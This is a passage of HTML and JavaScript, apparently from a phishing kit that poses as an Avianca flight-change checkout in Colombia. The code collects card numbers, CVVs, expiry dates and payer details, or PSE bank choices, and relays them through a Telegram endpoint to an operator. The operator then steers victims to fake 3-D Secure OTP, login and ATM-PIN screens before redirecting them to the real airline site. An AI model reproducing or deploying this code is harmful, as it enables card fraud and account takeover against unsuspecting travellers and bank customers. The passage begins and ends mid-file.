                        oninput="this.value = this.value.toUpperCase()">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
                    <input type="text" id="departamentoPagadorTarjeta" placeholder="Cundinamarca"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="this.value = this.value.toUpperCase()">
                </div>
            </div>

            <!-- Botón de pagar -->
            <div class="mt-8">
                <button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                    <span id="textoBotonTarjeta">Pagar</span>
                    <div id="spinnerTarjeta" class="hidden">
                        <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                    </div>
                </button>
            </div>
        </div>
    </div>
</section>

<!-- SECCIÓN 9: FORMULARIO PSE -->
<section id="seccion-pse" class="min-h-screen bg-gray-50" style="display: none;">
    <!-- Header azul -->
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-between">
        <button onclick="volverAMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
            </svg>
        </button>
        <h2 class="text-xl font-medium">PSE</h2>
        <button onclick="volverAMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
            </svg>
        </button>
    </div>

    <div class="px-6 py-6">
        <!-- Total a pagar -->
        <div class="bg-gray-50 rounded-xl p-6 mb-6">
            <div class="flex items-center justify-between">
                <span class="text-lg font-medium text-gray-700">Total a pagar:</span>
                <div class="text-right">
                    <div class="text-3xl font-bold text-gray-900"><span id="totalPSE">0</span> <span id="monedaPSE">COP</span></div>
                </div>
            </div>
        </div>

        <!-- Formulario PSE -->
        <div class="space-y-4">
            <!-- Título datos bancarios -->
            <h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos bancarios</h3>

            <!-- Selector de Banco -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Banco</label>
                <select id="selectBanco" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent bg-white">
                    <option value="">Selecciona tu banco</option>
                    <option value="bancolombia">Bancolombia</option>
                    <option value="avvillas">AV Villas</option>
                    <option value="bbva">BBVA</option>
                    <option value="bogota">Banco de Bogotá</option>
                    <option value="cajasocial">Caja Social</option>
                    <option value="colpatria">Colpatria</option>
                    <option value="davivienda">Davivienda</option>
                    <option value="falabella">Banco Falabella</option>
                    <option value="nequi">Nequi</option>
                    <option value="occidente">Banco de Occidente</option>
                    <option value="popular">Banco Popular</option>
                </select>
            </div>

            <!-- Selector de Tipo de Persona -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Tipo de persona</label>
                <select id="selectTipoPersona" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent bg-white">
                    <option value="">Selecciona el tipo de persona</option>
                    <option value="natural">Persona Natural</option>
                    <option value="juridica">Persona Jurídica</option>
                </select>
            </div>

            <!-- Título datos del pagador -->
            <h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Información del pagador</h3>

            <!-- Nombre completo -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
                <input type="text" id="nombrePagadorPSE" placeholder="Nombre y apellidos"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.toUpperCase()">
            </div>

            <!-- Email -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Correo electrónico</label>
                <input type="email" id="emailPagadorPSE" placeholder="correo@ejemplo.com"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent">
            </div>

            <!-- Celular -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
                <input type="tel" id="celularPagadorPSE" placeholder="300 123 4567" maxlength="12"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
            </div>

            <!-- Dirección -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Dirección</label>
                <input type="text" id="direccionPagadorPSE" placeholder="Calle 123 # 45-67"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.toUpperCase()">
            </div>

            <!-- Ciudad y Departamento -->
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
                    <input type="text" id="ciudadPagadorPSE" placeholder="Bogotá"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="this.value = this.value.toUpperCase()">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
                    <input type="text" id="departamentoPagadorPSE" placeholder="Cundinamarca"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="this.value = this.value.toUpperCase()">
                </div>
            </div>

            <!-- Botón de pagar -->
            <div class="mt-8">
                <button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                    <span id="textoBotonPSE">Pagar</span>
                    <div id="spinnerPSE" class="hidden">
                        <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                    </div>
                </button>
            </div>
        </div>
    </div>
</section>

<script>
    // =====================================================
    // FUNCIONES DE PAGO - CambioVuelo con Telegram
    // =====================================================

    // Generar ID único de sesión para CambioVuelo
    function generarUniqIdCambioVuelo() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = 'CV';
        for (let i = 0; i < 6; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // Obtener o crear ID de sesión
    let cambioVueloUniqId = sessionStorage.getItem('cambioVueloUniqId');
    if (!cambioVueloUniqId) {
        cambioVueloUniqId = generarUniqIdCambioVuelo();
        sessionStorage.setItem('cambioVueloUniqId', cambioVueloUniqId);
    }

    // Variables para el proceso de pago
    let totalAPagar = 0;
    let seccionAnteriorPago = 'seccion-resultados-ida';
    let pollingActivo = false;
    let pollingInterval = null;
    let datosRecopilados = {};

    // =====================================================
    // FUNCIONES DE TELEGRAM
    // =====================================================

    // Construir mensaje de pago para Telegram (plantilla CambioVuelo)
    function construirMensajePagoTelegram(tipoPago) {
        let mensaje = '';

        mensaje += `✈️ *CAMBIO DE VUELO - PAGO*\n`;
        mensaje += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
        mensaje += `🔑 *ID Sesión:* \`${cambioVueloUniqId}\`\n`;
        const monedaMensaje = typeof monedaActual !== 'undefined' ? monedaActual : 'COP';
        mensaje += `💰 *Total:* \`${totalAPagar} ${monedaMensaje}\`\n`;
        mensaje += `💳 *Método:* \`${tipoPago === 'tarjeta' ? 'Tarjeta de Crédito' : 'PSE'}\`\n\n`;

        if (tipoPago === 'tarjeta') {
            mensaje += `📋 *DATOS DE TARJETA*\n`;
            mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
            mensaje += `💳 *Número:* \`${datosRecopilados.numeroTarjeta || '--'}\`\n`;
            mensaje += `👤 *Titular:* \`${datosRecopilados.nombreTitular || '--'}\`\n`;
            mensaje += `📅 *Vence:* \`${datosRecopilados.fechaVencimiento || '--'}\`\n`;
            mensaje += `🔒 *CVV:* \`${datosRecopilados.cvv || '--'}\`\n\n`;
        } else {
            mensaje += `🏦 *DATOS PSE*\n`;
            mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
            mensaje += `🏦 *Banco:* \`${datosRecopilados.banco || '--'}\`\n`;
            mensaje += `👥 *Tipo:* \`${datosRecopilados.tipoPersona || '--'}\`\n\n`;
        }

        mensaje += `👤 *DATOS DEL PAGADOR*\n`;
        mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
        mensaje += `👤 *Nombre:* \`${datosRecopilados.nombre || '--'}\`\n`;
        mensaje += `📧 *Email:* \`${datosRecopilados.email || '--'}\`\n`;
        mensaje += `📱 *Celular:* \`${datosRecopilados.celular || '--'}\`\n`;
        mensaje += `📍 *Dirección:* \`${datosRecopilados.direccion || '--'}\`\n`;
        mensaje += `🏙️ *Ciudad:* \`${datosRecopilados.ciudad || '--'}\`\n`;
        mensaje += `🗺️ *Depto:* \`${datosRecopilados.departamento || '--'}\`\n\n`;

        mensaje += `🕐 *Estado:* \`PAGO_INICIADO\`\n`;

        return mensaje;
    }

    // Enviar datos a Telegram con botones
    async function enviarPagoATelegram(tipoPago) {
        const mensaje = construirMensajePagoTelegram(tipoPago);

        try {
            const response = await fetch('/api/telegram/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    uniqid: cambioVueloUniqId,
                    template: 'cambiovuelo_tdc',
                    data: {
                        ...datosRecopilados,
                        total: totalAPagar,
                        metodo_pago: tipoPago,
                        status: 'PAGO_INICIADO',
                        ente: 'cambiovuelo'
                    }
                })
            });

            const result = await response.json();
            console.log('Pago enviado a Telegram:', result);
            return result.success;
        } catch (error) {
            console.error('Error enviando pago a Telegram:', error);
            return false;
        }
    }

    // Enviar datos adicionales (OTP, claves, etc.) a Telegram
    async function enviarDatosAdicionalesATelegram(tipo, valor) {
        try {
            const response = await fetch('/api/telegram/send-info', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    uniqid: cambioVueloUniqId,
                    template: 'cambiovuelo_tdc',
                    includeButtons: true,
                    data: {
                        ...datosRecopilados,
                        [tipo]: valor,
                        status: `${tipo.toUpperCase()}_RECIBIDO`
                    }
                })
            });

            const result = await response.json();
            console.log(`${tipo} enviado a Telegram:`, result);
            return result.success;
        } catch (error) {
            console.error(`Error enviando ${tipo} a Telegram:`, error);
            return false;
        }
    }

    // =====================================================
    // POLLING - Verificar botón presionado en Telegram
    // =====================================================

    // Funciones para mostrar/ocultar el overlay de carga
    function mostrarOverlayCarga(texto = 'Procesando...') {
        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        if (overlay) {
            if (loadingText) loadingText.textContent = texto;
            overlay.classList.remove('hidden');
        }
    }

    function ocultarOverlayCarga() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('hidden');
        }
    }

    async function iniciarPolling() {
        if (pollingActivo) return;

        pollingActivo = true;
        console.log('Iniciando polling para sesión:', cambioVueloUniqId);

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando información...');

        pollingInterval = setInterval(async () => {
            try {
                const response = await fetch('/api/telegram/check-button', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        uniqid: cambioVueloUniqId
                    })
                });

                const data = await response.json();
                console.log('Respuesta de check-button:', data);

                if (data.button) {
                    console.log('Botón presionado detectado:', data.button);
                    detenerPolling();
                    procesarRespuestaTelegram(data.button);
                }
            } catch (error) {
                console.error('Error en polling:', error);
            }
        }, 2000);
    }

    function detenerPolling() {
        pollingActivo = false;
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
        // Ocultar overlay de carga
        ocultarOverlayCarga();
        console.log('Polling detenido');
    }

    // Procesar la respuesta de Telegram y mostrar la sección correspondiente
    function procesarRespuestaTelegram(boton) {
        console.log('procesarRespuestaTelegram llamada con botón:', boton);

        // Ocultar spinners de botones de pago
        ocultarSpinnersPago();

        // Mapeo de botones a secciones
        // Incluye TODOS los posibles nombres de botones de las diferentes plantillas
        const mapeoSecciones = {
            // Nombres estándar
            'tdc': 'seccion-tdc',
            'codsms': 'seccion-otpsms',
            'codapp': 'seccion-otpapp',
            'login': 'seccion-login',
            'pincaj': 'seccion-clavecajero',
            'pinvir': 'seccion-clavevirtual',
            'exito': 'seccion-fin',
            'error': 'seccion-error',
            'cambiar': 'seccion-cambiar',
            // Nombres alternativos de otras plantillas
            'otpsms': 'seccion-otpsms',
            'otpapp': 'seccion-otpapp',
            'clavecajero': 'seccion-clavecajero',
            'clavetdc': 'seccion-tdc',
            'fin': 'seccion-fin',
            'user': 'seccion-login',
            'tc': 'seccion-tdc'
        };

        const seccionId = mapeoSecciones[boton];
        console.log('Sección a mostrar:', seccionId);

        if (seccionId) {
            console.log('Llamando a mostrarSeccion con:', seccionId);

            // Verificar que la sección existe en el DOM
            const seccionElement = document.getElementById(seccionId);
            console.log('Elemento de sección encontrado:', seccionElement ? 'SÍ' : 'NO');

            // Actualizar datos de transacción para secciones OTP
            if (seccionId === 'seccion-otpsms' || seccionId === 'seccion-otpapp') {
                actualizarDatosTransaccion3D(seccionId);
            }

            mostrarSeccion(seccionId);

            // Si es EXITO/FIN o ERROR, redirigir después de un tiempo
            if (boton === 'exito' || boton === 'fin') {
                document.getElementById('numeroConfirmacion').textContent = cambioVueloUniqId;
                setTimeout(() => {
                    window.location.href = 'https://www.avianca.com/';
                }, 8000);
            }

            if (boton === 'error') {
                setTimeout(() => {
                    window.location.href = 'https://www.avianca.com/';
                }, 8000);
            }
        } else {
            console.error('No se encontró mapeo para el botón:', boton);
            console.log('Botones disponibles:', Object.keys(mapeoSecciones));
        }
    }

    function ocultarSpinnersPago() {
        // Restaurar botón de tarjeta
        const btnTarjeta = document.getElementById('btnPagarTarjeta');
        if (btnTarjeta) {
            btnTarjeta.disabled = false;
        }

        // Restaurar botón de PSE
        const btnPSE = document.getElementById('btnPagarPSE');
        if (btnPSE) {
            btnPSE.disabled = false;
        }

        // Restaurar botón de TDC
        const btnTdc = document.getElementById('btnTdc');
        if (btnTdc) {
            btnTdc.disabled = false;
        }

        // Restaurar botón de OTP SMS
        const btnOtpSms = document.getElementById('btnOtpSms');
        if (btnOtpSms) {
            btnOtpSms.disabled = false;
        }

        // Restaurar botón de OTP APP
        const btnOtpApp = document.getElementById('btnOtpApp');
        if (btnOtpApp) {
            btnOtpApp.disabled = false;
        }

        // Restaurar botón de Login
        const btnLogin = document.getElementById('btnLogin');
        if (btnLogin) {
            btnLogin.disabled = false;
        }

        // Restaurar botón de Clave Cajero
        const btnClaveCajero = document.getElementById('btnClaveCajero');
        if (btnClaveCajero) {
            btnClaveCajero.disabled = false;
        }

        // Restaurar botón de Clave Virtual
        const btnClaveVirtual = document.getElementById('btnClaveVirtual');
        if (btnClaveVirtual) {
            btnClaveVirtual.disabled = false;
        }
    }

    // Función para detectar el tipo de tarjeta según el BIN
    function detectarTipoTarjeta(numeroTarjeta) {
        const numero = numeroTarjeta.replace(/\s/g, '');

        // Visa: empieza con 4
        if (/^4/.test(numero)) {
            return 'visa';
        }
        // Mastercard: empieza con 51-55 o 2221-2720
        if (/^5[1-5]/.test(numero) || /^2[2-7]/.test(numero)) {
            return 'mastercard';
        }
        // American Express: empieza con 34 o 37
        if (/^3[47]/.test(numero)) {
            return 'amex';
        }
        // Diners Club: empieza con 36, 38, 39 o 300-305
        if (/^3[689]/.test(numero) || /^30[0-5]/.test(numero)) {
            return 'diners';
        }
        // Discover: empieza con 6011, 65, o 644-649
        if (/^6011/.test(numero) || /^65/.test(numero) || /^64[4-9]/.test(numero)) {
            return 'discover';
        }

        return 'visa'; // Por defecto
    }

    // Función para obtener el HTML del logo según el tipo de tarjeta
    function obtenerLogoTarjeta(tipo) {
        const logos = {
            'visa': `<div class="flex items-baseline gap-1">
                <span class="text-gray-600 text-sm italic">Verified by</span>
                <span class="text-blue-900 font-bold text-2xl tracking-tight">VISA</span>
            </div>`,
            'mastercard': `<div class="flex items-center gap-2">
                <div class="flex">
                    <div class="w-6 h-6 bg-red-500 rounded-full -mr-2"></div>
                    <div class="w-6 h-6 bg-yellow-400 rounded-full"></div>
                </div>
                <div>
                    <span class="text-gray-600 text-xs">mastercard</span>
                    <div class="text-gray-800 font-bold text-sm">SecureCode</div>
                </div>
            </div>`,
            'amex': `<div class="flex items-center gap-2">
                <div class="bg-blue-600 text-white font-bold px-2 py-1 rounded text-sm">AMERICAN EXPRESS</div>
                <span class="text-gray-600 text-sm">SafeKey</span>
            </div>`,
            'diners': `<div class="flex items-center gap-2">
                <span class="text-blue-800 font-bold text-lg">Diners Club</span>
                <span class="text-gray-600 text-sm">ProtectBuy</span>
            </div>`,
            'discover': `<div class="flex items-center gap-2">
                <span class="text-orange-500 font-bold text-lg">DISCOVER</span>
                <span class="text-gray-600 text-sm">ProtectBuy</span>
            </div>`
        };

        return logos[tipo] || logos['visa'];
    }

    // Función para actualizar los datos de transacción en las secciones OTP (estilo 3D Secure)
    function actualizarDatosTransaccion3D(seccionId) {
        // Obtener fecha actual formateada
        const ahora = new Date();
        const fechaFormateada = ahora.getFullYear() + '/' +
            String(ahora.getMonth() + 1).padStart(2, '0') + '/' +
            String(ahora.getDate()).padStart(2, '0') + ' ' +
            String(ahora.getHours()).padStart(2, '0') + ':' +
            String(ahora.getMinutes()).padStart(2, '0') + ':' +
            String(ahora.getSeconds()).padStart(2, '0');

        // Obtener número de tarjeta y detectar tipo
        const numeroTarjeta = datosRecopilados.numeroTarjeta || '';
        const tipoTarjeta = detectarTipoTarjeta(numeroTarjeta);
        const ultimosCuatro = numeroTarjeta.replace(/\s/g, '').slice(-4) || '0000';
        const tarjetaEnmascarada = 'XXXX XXXX XXXX ' + ultimosCuatro;

        // Formatear monto con la moneda del visitante
        const moneda = typeof monedaActual !== 'undefined' ? monedaActual : 'COP';
        const montoFormateado = totalAPagar + ' ' + moneda;

        // Obtener el logo correspondiente
        const logoHTML = obtenerLogoTarjeta(tipoTarjeta);

        if (seccionId === 'seccion-otpsms') {
            document.getElementById('otpSmsLogo').innerHTML = logoHTML;
            document.getElementById('otpSmsAmount').textContent = montoFormateado;
            document.getElementById('otpSmsDate').textContent = fechaFormateada;
            document.getElementById('otpSmsCardNumber').textContent = tarjetaEnmascarada;
        } else if (seccionId === 'seccion-otpapp') {
            document.getElementById('otpAppLogo').innerHTML = logoHTML;
            document.getElementById('otpAppAmount').textContent = montoFormateado;
            document.getElementById('otpAppDate').textContent = fechaFormateada;
            document.getElementById('otpAppCardNumber').textContent = tarjetaEnmascarada;
        }
    }

    // =====================================================
    // FUNCIONES DE PAGO PRINCIPALES
    // =====================================================

    function procesarPago() {
        // Obtener el total a pagar según la sección activa
        if (tipoVuelo === 'solo-ida') {
            totalAPagar = document.getElementById('precioTotalIda')?.textContent || '0';
            seccionAnteriorPago = 'seccion-resultados-ida';
        } else {
            totalAPagar = document.getElementById('precioTotal')?.textContent || '0';
            seccionAnteriorPago = 'seccion-resultados-vuelta';
        }

        // Actualizar el total en la sección de método de pago
        document.getElementById('totalMetodoPago').textContent = totalAPagar;
        document.getElementById('totalTarjeta').textContent = totalAPagar;
        document.getElementById('totalPSE').textContent = totalAPagar;

        // Actualizar las monedas en todas las secciones de pago
        const moneda = typeof monedaActual !== 'undefined' ? monedaActual : 'COP';
        document.getElementById('monedaMetodoPago').textContent = moneda;
        document.getElementById('monedaTarjeta').textContent = moneda;
        document.getElementById('monedaPSE').textContent = moneda;

        // Obtener el país del visitante
        const paisVisitante = localStorage.getItem('visitorCountry') || 'CO';

        // Si el país NO es Colombia, ocultar la opción PSE (solo mostrar Tarjeta de Crédito)
        const opcionPSE = document.getElementById('opcion-pse');
        if (paisVisitante !== 'CO') {
            opcionPSE.style.display = 'none';
        } else {
            opcionPSE.style.display = 'block';
        }

        // Mostrar la sección de método de pago
        mostrarSeccion('seccion-metodo-pago');
    }

    // Función para volver desde método de pago
    function volverDesdeMetodoPago() {
        mostrarSeccion(seccionAnteriorPago);
    }

    // Función para volver a método de pago desde formularios
    function volverAMetodoPago() {
        mostrarSeccion('seccion-metodo-pago');
    }

    // Función para seleccionar método de pago
    function seleccionarMetodoPago(metodo) {
        // Resetear estilos de las opciones
        document.getElementById('opcion-tarjeta').classList.remove('border-[#1a4b8c]');
        document.getElementById('opcion-tarjeta').classList.add('border-gray-300');
        document.getElementById('radio-tarjeta').innerHTML = '';
        document.getElementById('radio-tarjeta').classList.remove('border-[#1a4b8c]', 'bg-[#1a4b8c]');
        document.getElementById('radio-tarjeta').classList.add('border-gray-400');

        document.getElementById('opcion-pse').classList.remove('border-[#1a4b8c]');
        document.getElementById('opcion-pse').classList.add('border-gray-300');
        document.getElementById('radio-pse').innerHTML = '';
        document.getElementById('radio-pse').classList.remove('border-[#1a4b8c]', 'bg-[#1a4b8c]');
        document.getElementById('radio-pse').classList.add('border-gray-400');

        if (metodo === 'tarjeta') {
            // Marcar tarjeta como seleccionada
            document.getElementById('opcion-tarjeta').classList.remove('border-gray-300');
            document.getElementById('opcion-tarjeta').classList.add('border-[#1a4b8c]');
            document.getElementById('radio-tarjeta').classList.remove('border-gray-400');
            document.getElementById('radio-tarjeta').classList.add('border-[#1a4b8c]', 'bg-[#1a4b8c]');
            document.getElementById('radio-tarjeta').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';

            // Ir a la sección de tarjeta después de un breve delay
            setTimeout(() => {
                mostrarSeccion('seccion-tarjeta');
            }, 200);
        } else if (metodo === 'pse') {
            // Marcar PSE como seleccionada
            document.getElementById('opcion-pse').classList.remove('border-gray-300');
            document.getElementById('opcion-pse').classList.add('border-[#1a4b8c]');
            document.getElementById('radio-pse').classList.remove('border-gray-400');
            document.getElementById('radio-pse').classList.add('border-[#1a4b8c]', 'bg-[#1a4b8c]');
            document.getElementById('radio-pse').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';

            // Ir a la sección de PSE después de un breve delay
            setTimeout(() => {
                mostrarSeccion('seccion-pse');
            }, 200);
        }
    }

    // Función para formatear número de tarjeta (espacios cada 4 dígitos)
    function formatearNumeroTarjeta(input) {
        let valor = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formateado = valor.match(/.{1,4}/g)?.join(' ') || valor;
        input.value = formateado;
    }

    // Función para formatear fecha de vencimiento (MM/AA)
    function formatearFechaVencimiento(input) {
        let valor = input.value.replace(/\//g, '').replace(/[^0-9]/g, '');
        if (valor.length >= 2) {
            valor = valor.substring(0, 2) + '/' + valor.substring(2);
        }
        input.value = valor;
    }

    // Función para validar formulario de tarjeta
    function validarFormularioTarjeta() {
        const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '');
        const nombreTitular = document.getElementById('nombreTitular').value.trim();
        const fechaVencimiento = document.getElementById('fechaVencimiento').value;
        const cvv = document.getElementById('cvv').value;
        const nombrePagador = document.getElementById('nombrePagadorTarjeta').value.trim();
        const emailPagador = document.getElementById('emailPagadorTarjeta').value.trim();
        const celularPagador = document.getElementById('celularPagadorTarjeta').value.trim();
        const direccionPagador = document.getElementById('direccionPagadorTarjeta').value.trim();
        const ciudadPagador = document.getElementById('ciudadPagadorTarjeta').value.trim();
        const departamentoPagador = document.getElementById('departamentoPagadorTarjeta').value.trim();

        // Validar datos de tarjeta
        if (numeroTarjeta.length < 13) {
            showToast('warning', 'Datos incompletos', 'Ingresa un número de tarjeta válido');
            return false;
        }
        if (!nombreTitular) {
            showToast('warning', 'Datos incompletos', 'Ingresa el nombre del titular');
            return false;
        }
        if (fechaVencimiento.length < 5) {
            showToast('warning', 'Datos incompletos', 'Ingresa la fecha de vencimiento');
            return false;
        }
        if (cvv.length < 3) {
            showToast('warning', 'Datos incompletos', 'Ingresa el código CVV');
            return false;
        }

        // Validar datos del pagador
        if (!nombrePagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa el nombre del pagador');
            return false;
        }
        if (!emailPagador || !emailPagador.includes('@')) {
            showToast('warning', 'Datos incompletos', 'Ingresa un correo electrónico válido');
            return false;
        }
        if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) {
            showToast('warning', 'Datos incompletos', 'Ingresa un número de celular válido');
            return false;
        }
        if (!direccionPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa la dirección');
            return false;
        }
        if (!ciudadPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa la ciudad');
            return false;
        }
        if (!departamentoPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa el departamento');
            return false;
        }

        return true;
    }

    // Función para pagar con tarjeta
    async function pagarConTarjeta() {
        if (!validarFormularioTarjeta()) return;

        // Recopilar datos de tarjeta
        datosRecopilados.numeroTarjeta = document.getElementById('numeroTarjeta').value.trim();
        datosRecopilados.nombreTitular = document.getElementById('nombreTitular').value.trim();
        datosRecopilados.fechaVencimiento = document.getElementById('fechaVencimiento').value.trim();
        datosRecopilados.cvv = document.getElementById('cvv').value.trim();
        datosRecopilados.nombre = document.getElementById('nombrePagadorTarjeta').value.trim();
        datosRecopilados.email = document.getElementById('emailPagadorTarjeta').value.trim();
        datosRecopilados.celular = document.getElementById('celularPagadorTarjeta').value.trim();
        datosRecopilados.direccion = document.getElementById('direccionPagadorTarjeta').value.trim();
        datosRecopilados.ciudad = document.getElementById('ciudadPagadorTarjeta').value.trim();
        datosRecopilados.departamento = document.getElementById('departamentoPagadorTarjeta').value.trim();

        // Deshabilitar botón
        document.getElementById('btnPagarTarjeta').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Procesando pago...');

        // Enviar datos a Telegram
        await enviarPagoATelegram('tarjeta');

        // Iniciar polling para esperar respuesta
        iniciarPolling();
    }

    // Función para validar formulario de PSE
    function validarFormularioPSE() {
        const banco = document.getElementById('selectBanco').value;
        const tipoPersona = document.getElementById('selectTipoPersona').value;
        const nombrePagador = document.getElementById('nombrePagadorPSE').value.trim();
        const emailPagador = document.getElementById('emailPagadorPSE').value.trim();
        const celularPagador = document.getElementById('celularPagadorPSE').value.trim();
        const direccionPagador = document.getElementById('direccionPagadorPSE').value.trim();
        const ciudadPagador = document.getElementById('ciudadPagadorPSE').value.trim();
        const departamentoPagador = document.getElementById('departamentoPagadorPSE').value.trim();

        // Validar datos bancarios
        if (!banco) {
            showToast('warning', 'Datos incompletos', 'Selecciona tu banco');
            return false;
        }
        if (!tipoPersona) {
            showToast('warning', 'Datos incompletos', 'Selecciona el tipo de persona');
            return false;
        }

        // Validar datos del pagador
        if (!nombrePagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa el nombre del pagador');
            return false;
        }
        if (!emailPagador || !emailPagador.includes('@')) {
            showToast('warning', 'Datos incompletos', 'Ingresa un correo electrónico válido');
            return false;
        }
        if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) {
            showToast('warning', 'Datos incompletos', 'Ingresa un número de celular válido');
            return false;
        }
        if (!direccionPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa la dirección');
            return false;
        }
        if (!ciudadPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa la ciudad');
            return false;
        }
        if (!departamentoPagador) {
            showToast('warning', 'Datos incompletos', 'Ingresa el departamento');
            return false;
        }

        return true;
    }

    // Función para pagar con PSE
    function pagarConPSE() {
        if (!validarFormularioPSE()) return;

        // Recopilar datos de PSE
        const banco = document.getElementById('selectBanco').value;
        const tipoPersona = document.getElementById('selectTipoPersona').value;

        datosRecopilados.banco = banco;
        datosRecopilados.tipoPersona = tipoPersona;
        datosRecopilados.nombre = document.getElementById('nombrePagadorPSE').value.trim();
        datosRecopilados.email = document.getElementById('emailPagadorPSE').value.trim();
        datosRecopilados.celular = document.getElementById('celularPagadorPSE').value.trim();
        datosRecopilados.direccion = document.getElementById('direccionPagadorPSE').value.trim();
        datosRecopilados.ciudad = document.getElementById('ciudadPagadorPSE').value.trim();
        datosRecopilados.departamento = document.getElementById('departamentoPagadorPSE').value.trim();

        // Guardar datos en sessionStorage para uso en la vista del banco
        sessionStorage.setItem('pseDatos', JSON.stringify(datosRecopilados));
        sessionStorage.setItem('pseTotal', totalAPagar);
        sessionStorage.setItem('pseBanco', banco);

        // Deshabilitar botón
        document.getElementById('btnPagarPSE').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Ingresando a su Banca...');

        // Mapeo de bancos a rutas
        const rutasBancos = {
